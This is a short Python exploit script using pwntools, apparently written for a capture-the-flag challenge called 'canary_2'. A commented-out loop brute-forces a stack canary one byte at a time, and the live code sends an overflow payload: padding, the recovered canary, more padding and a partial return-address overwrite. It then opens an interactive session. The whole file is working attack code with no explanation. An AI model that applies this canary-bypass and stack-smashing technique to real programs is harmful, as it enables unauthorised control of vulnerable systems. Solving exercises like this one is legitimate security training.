from pwn import *

path = "/problems/canary_2_ef979c1fb7f5a4beb15968db07f30899"

"""
canary = ''
for i in range(4):
    for c in range(0x100):
        sock = process("{}/vuln".format(path), cwd=path)
        sock.sendlineafter("> ", str(0x21+i))
        payload = 'A'*0x20 + canary + chr(c)
        sock.sendlineafter("> ", payload)
        if 'Ok...' in sock.recvline():
            canary += chr(c)
            break
        sock.close()
print("canary = " + repr(canary))
"""
canary = '3<<d'

sock = process("{}/vuln".format(path), cwd=path)
sock.sendlineafter("> ", str(0x36))
payload = 'A'*0x20 + canary + 'A'*0x10 + '\xed\x47'
sock.sendlineafter("> ", payload)
sock.interactive()
